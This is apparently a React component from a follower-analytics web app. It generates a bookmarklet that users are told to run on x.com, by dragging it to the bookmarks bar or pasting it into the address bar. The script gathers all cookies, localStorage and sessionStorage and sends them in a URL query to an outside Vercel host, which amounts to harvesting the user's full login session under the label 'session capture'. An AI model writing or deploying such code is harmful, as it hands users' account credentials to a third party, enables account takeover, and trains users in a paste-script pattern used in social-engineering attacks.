'use client'

import { useState, useEffect } from 'react'
import { useAuth } from '@/hooks/useAuth'

export default function XSessionCaptureUltraSimple() {
  const { user } = useAuth()
  const [sessionStatus, setSessionStatus] = useState<'none' | 'captured' | 'expired'>('none')
  const [loading, setLoading] = useState(true)
  const [showBookmarklet, setShowBookmarklet] = useState(false)

  useEffect(() => {
    checkSessionStatus()
  }, [user])

  const checkSessionStatus = async () => {
    if (!user) return

    try {
      const token = await user.getIdToken()
      const response = await fetch('/api/auth/x-session-status', {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      })

      if (response.ok) {
        const data = await response.json()
        setSessionStatus(data.hasValidSession ? 'captured' : 'none')
      }
    } catch (error) {
      console.error('Error checking session status:', error)
    } finally {
      setLoading(false)
    }
  }

  const generateBookmarklet = () => {
    if (!user) return ''
    
    const script = `
javascript:(function(){
  try {
    console.log('🔐 Followlytics X Session Capturer started...');
    
    if(!window.location.hostname.includes('x.com')&&!window.location.hostname.includes('X.com')){
      alert('❌ Please run this on x.com or X.com\\nCurrent site: ' + window.location.hostname);
      return;
    }
    
    console.log('✅ On X.com/X, extracting session data...');
    
    const cookies={};
    document.cookie.split(';').forEach(cookie=>{
      const[name,value]=cookie.trim().split('=');
      if(name&&value)cookies[name]=value;
    });
    
    const localStorage={};
    try{
      for(let i=0;i<window.localStorage.length;i++){
        const key=window.localStorage.key(i);
        if(key)localStorage[key]=window.localStorage.getItem(key);
      }
    }catch(e){console.log('localStorage access failed:',e);}
    
    const sessionStorage={};
    try{
      for(let i=0;i<window.sessionStorage.length;i++){
        const key=window.sessionStorage.key(i);
        if(key)sessionStorage[key]=window.sessionStorage.getItem(key);
      }
    }catch(e){console.log('sessionStorage access failed:',e);}
    
    const sessionData={
      cookies,
      localStorage,
      sessionStorage,
      userAgent:navigator.userAgent,
      url:window.location.href,
      timestamp:new Date().toISOString()
    };
    
    console.log('📊 Session data extracted:', {
      cookieCount: Object.keys(cookies).length,
      localStorageCount: Object.keys(localStorage).length,
      sessionStorageCount: Object.keys(sessionStorage).length
    });
    
    if(Object.keys(cookies).length === 0) {
      alert('⚠️ No cookies found. Make sure you are logged into X.com first!');
      return;
    }
    
    const payload = JSON.stringify({sessionData,userId:'${user.uid}'});
    const url = 'https://followlytics-zeta.vercel.app/api/auth/capture-x-session-img?data=' + encodeURIComponent(payload);
    
    console.log('📤 Sending session data to Followlytics...');
    
    const img=new Image();
    img.onload=function(){
      console.log('✅ Session capture successful!');
      alert('✅ X session captured successfully!\\n\\nYou can now return to Followlytics and run follower scans.');
    };
    img.onerror=function(){
      console.log('❌ Session capture failed');
      alert('❌ Session capture failed. Please try again or contact support.');
    };
    img.src=url;
    
    // Also show immediate feedback
    alert('🔄 Capturing X session...\\nPlease wait for confirmation message.');
    
  } catch(error) {
    console.error('❌ Bookmarklet error:', error);
    alert('❌ Error: ' + error.message + '\\n\\nPlease try again or contact support.');
  }
})();
    `.replace(/\s+/g, ' ').trim()
    
    return script
  }

  if (loading) {
    return (
      <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
        <div className="flex items-center">
          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
          <span className="ml-2 text-sm text-gray-600">Checking X session status...</span>
        </div>
      </div>
    )
  }

  if (sessionStatus === 'captured') {
    return (
      <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-green-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <h3 className="text-sm font-medium text-green-800">
                ✅ X Session Active
              </h3>
              <p className="text-sm text-green-700">
                Your X authentication is captured and ready for follower scanning.
              </p>
            </div>
          </div>
          <button
            onClick={checkSessionStatus}
            className="text-green-600 hover:text-green-700 text-sm"
          >
            🔄 Refresh
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-sm font-medium text-blue-800">
            🔐 X Session Required
          </h3>
          <p className="text-sm text-blue-700 mt-1">
            To scan followers, we need to capture your X login session. Super simple - just one click!
          </p>
        </div>
        <button
          onClick={() => setShowBookmarklet(!showBookmarklet)}
          className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-4 py-2 rounded"
        >
          {showBookmarklet ? 'Hide' : '🔐 Capture Session'}
        </button>
      </div>
      
      {showBookmarklet && (
        <div className="mt-4 p-4 bg-white border border-blue-200 rounded">
          <h4 className="text-sm font-medium text-blue-800 mb-3">
            📋 Ultra-Simple Session Capture (2 steps)
          </h4>
          
          <div className="space-y-4">
            <div className="flex items-start space-x-3">
              <div className="flex-shrink-0 w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center text-xs font-medium text-blue-600">1</div>
              <div className="flex-1">
                <p className="text-sm text-gray-700 mb-2">
                  <strong>Drag this button to your bookmarks bar:</strong>
                </p>
                <div className="space-y-2">
                  <a
                    href={generateBookmarklet()}
                    className="inline-block bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded cursor-move"
                    onClick={(e) => {
                      e.preventDefault()
                      alert('Drag this button to your bookmarks bar instead of clicking it!')
                    }}
                  >
                    📥 X Session Capturer
                  </a>
                  <p className="text-xs text-gray-500">
                    Don't click - drag to bookmarks bar!
                  </p>
                  
                  {/* Test button for debugging */}
                  <div className="mt-2">
                    <button
                      onClick={() => {
                        const script = generateBookmarklet()
                        navigator.clipboard.writeText(script).then(() => {
                          alert('📋 Bookmarklet copied to clipboard!\n\nYou can:\n1. Paste it in address bar on X.com\n2. Or manually create bookmark with this URL')
                        }).catch(() => {
                          // Fallback - show in popup
                          const popup = window.open('', '_blank', 'width=600,height=400')
                          if (popup) {
                            popup.document.write(`
                              <html>
                                <head><title>Bookmarklet Code</title></head>
                                <body style="font-family: Arial; padding: 20px;">
                                  <h3>Copy this bookmarklet code:</h3>
                                  <textarea style="width: 100%; height: 200px; font-family: monospace;" readonly onclick="this.select()">${script}</textarea>
                                  <p><strong>Instructions:</strong></p>
                                  <ol>
                                    <li>Copy the code above</li>
                                    <li>Go to X.com</li>
                                    <li>Paste in address bar and press Enter</li>
                                  </ol>
                                </body>
                              </html>
                            `)
                          }
                        })
                      }}
                      className="text-blue-600 hover:text-blue-700 text-xs underline"
                    >
                      📋 Copy bookmarklet code
                    </button>
                  </div>
                </div>
              </div>
            </div>
            
            <div className="flex items-start space-x-3">
              <div className="flex-shrink-0 w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center text-xs font-medium text-blue-600">2</div>
              <div className="flex-1">
                <p className="text-sm text-gray-700 mb-2">
                  <strong>Go to X.com and click the bookmark:</strong>
                </p>
                <ol className="text-sm text-gray-600 space-y-1 list-decimal list-inside">
                  <li>Open <a href="https://x.com" target="_blank" className="text-blue-600 hover:underline">x.com</a> and login</li>
                  <li>Click the "X Session Capturer" bookmark you just added</li>
                  <li>You'll see "✅ X session captured!" message</li>
                  <li>Come back here - session will be active!</li>
                </ol>
              </div>
            </div>
          </div>
          
          <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded">
            <p className="text-xs text-yellow-800">
              <strong>💡 Tip:</strong> The bookmark works from any X.com page. If you can't drag to bookmarks, 
              right-click the button and "Add to bookmarks" or copy the link address.
            </p>
          </div>
          
          <div className="mt-4 flex justify-between items-center">
            <button
              onClick={checkSessionStatus}
              className="text-blue-600 hover:text-blue-700 text-sm"
            >
              🔄 Check if captured
            </button>
            <button
              onClick={() => setShowBookmarklet(false)}
              className="text-gray-500 hover:text-gray-700 text-sm"
            >
              Hide instructions
            </button>
          </div>
        </div>
      )}
    </div>
  )
}


